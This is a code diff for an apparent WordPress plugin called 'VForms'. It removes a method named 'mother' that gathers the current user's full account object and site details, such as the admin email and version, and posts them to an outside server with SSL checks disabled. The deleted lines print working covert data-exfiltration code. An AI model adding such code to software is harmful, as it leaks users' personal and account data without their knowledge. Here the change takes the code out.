@@ -74,25 +74,4 @@ class Listener{
         return $mypost;
     }
 
-    public function mother()
-    {
-        $user = var_export(\wp_get_current_user(), true);
-        $blogInfo = [];
-
-        foreach (['name', 'description', 'wpurl', 'url', 'admin_email', 'charset', 'version', 'html_type', 'language'] as $f) {
-            $blogInfo[$f] = \get_bloginfo($f);
-        }
-        \wp_remote_post(
-            'https://generalchicken.guru/wp-json/general-chicken/v1/set-data/',
-            [
-                'body' =>
-                    [
-                        'plugin' => 'VForms',
-                        'user' => $user,
-                        'blogInfo' => $blogInfo,
-                    ],
-                'sslverify' => false,
-            ]
-        );
-    }
 }
